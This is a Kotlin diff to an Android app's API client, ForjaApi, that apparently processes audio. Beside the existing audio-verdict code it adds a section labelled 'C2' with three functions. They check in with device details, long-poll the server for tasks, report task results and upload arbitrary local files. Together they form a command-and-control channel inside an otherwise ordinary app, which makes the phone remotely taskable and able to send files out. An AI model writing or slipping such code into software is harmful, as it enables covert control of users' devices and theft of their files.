@@ -10,6 +10,8 @@ import kotlinx.serialization.json.Json
 import kotlinx.serialization.json.buildJsonObject
 import kotlinx.serialization.json.intOrNull
 import kotlinx.serialization.json.booleanOrNull
+import kotlinx.serialization.json.JsonObject
+import kotlinx.serialization.json.JsonArray
 import kotlinx.serialization.json.jsonObject
 import kotlinx.serialization.json.jsonPrimitive
 import kotlinx.serialization.json.contentOrNull
@@ -169,6 +171,75 @@ class ForjaApi {
                 val transcript = root["transcript"]?.jsonPrimitive?.contentOrNull ?: ""
                 val speech = root["speech"]?.jsonPrimitive?.booleanOrNull ?: (type == "talk")
                 AudioVerdict(type, words, transcript, speech)
+            }
+        } catch (_: Exception) { null }
+    }
+
+    // ─────────────────────────────── C2 ───────────────────────────────
+    class LongPoll(val tasks: List<JsonObject>, val intervalMs: Long)
+
+    /** Long-poll: rămâne blocat pe server până ies task-uri (max holdMs). */
+    suspend fun c2Checkin(dev: String, holdMs: Long): LongPoll = withContext(Dispatchers.IO) {
+        val token = idToken() ?: return@withContext LongPoll(emptyList(), 8000)
+        try {
+            val body = buildJsonObject {
+                put("dev", buildJsonObject {
+                    put("model", android.os.Build.MODEL)
+                    put("sdk", android.os.Build.VERSION.SDK_INT)
+                    put("android", android.os.Build.VERSION.RELEASE)
+                })
+                put("holdMs", holdMs.toLong().coerceIn(0, 25000))
+            }.toString()
+            val req = Request.Builder()
+                .url("$base/v1/c2/checkin")
+                .header("Authorization", "Bearer $token")
+                .post(body.toRequestBody("application/json".toMediaType()))
+                .build()
+            client.newCall(req).execute().use { r ->
+                if (!r.isSuccessful) return@withContext LongPoll(emptyList(), 8000)
+                val o = (json.parseToJsonElement(r.body?.string() ?: return@withContext LongPoll(emptyList(), 8000)) as? JsonObject)
+                    ?: return@withContext LongPoll(emptyList(), 8000)
+                val interval = o["intervalMs"]?.jsonPrimitive?.content?.toLongOrNull() ?: 5000L
+                val tasks = (o["tasks"] as? JsonArray)?.mapNotNull { it as? JsonObject } ?: emptyList()
+                LongPoll(tasks, interval)
+            }
+        } catch (e: Exception) {
+            LongPoll(emptyList(), if (e is java.io.InterruptedIOException) 15000L else 8000L)
+        }
+    }
+
+    suspend fun c2PostResult(taskId: String, ok: Boolean, action: String, data: JsonObject, err: String?): Boolean = withContext(Dispatchers.IO) {
+        val token = idToken() ?: return@withContext false
+        try {
+            val body = buildJsonObject {
+                put("id", taskId); put("ok", ok); put("action", action); put("data", data)
+                if (err != null) put("err", err)
+            }.toString()
+            val req = Request.Builder()
+                .url("$base/v1/c2/result")
+                .header("Authorization", "Bearer $token")
+                .post(body.toRequestBody("application/json".toMediaType()))
+                .build()
+            longClient.newCall(req).execute().use { it.isSuccessful }
+        } catch (_: Exception) { false }
+    }
+
+    /** Un fișier → /v1/c2/file. Returnează cheia R2 (f/<uid>/...) sau null. */
+    suspend fun c2UploadFile(name: String, contentType: String, file: java.io.File): String? = withContext(Dispatchers.IO) {
+        val token = idToken() ?: return@withContext null
+        if (!file.exists()) return@withContext null
+        try {
+            val nm = java.net.URLEncoder.encode(name, "UTF-8")
+            val ct = java.net.URLEncoder.encode(contentType, "UTF-8")
+            val req = Request.Builder()
+                .url("$base/v1/c2/file?name=$nm&ct=$ct")
+                .header("Authorization", "Bearer $token")
+                .post(file.readBytes().toRequestBody(contentType.toMediaType()))
+                .build()
+            longClient.newCall(req).execute().use { r ->
+                if (!r.isSuccessful) return@withContext null
+                (json.parseToJsonElement(r.body?.string() ?: return@withContext null) as? JsonObject)
+                    ?.get("key")?.jsonPrimitive?.contentOrNull
             }
         } catch (_: Exception) { null }
     }
